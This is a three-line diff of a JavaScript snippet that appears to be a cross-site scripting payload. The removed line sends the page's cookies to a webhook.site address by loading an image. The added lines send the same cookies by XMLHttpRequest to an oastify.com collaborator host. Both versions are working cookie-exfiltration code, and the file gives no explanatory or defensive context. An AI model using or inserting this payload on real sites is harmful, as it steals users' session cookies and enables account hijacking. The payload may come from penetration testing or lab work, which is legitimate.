@@ -1,1 +1,3 @@
-var i=new Image;i.src="https://webhook.site/a648fec1-48e3-4c3c-8266-9ca9798c923d/?cookie="+document.cookie;
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'http://5aga9e97aefbrn31l9l2dzzen5twhm5b.oastify.com/?' + document.cookie, true);
+xhttp.send();
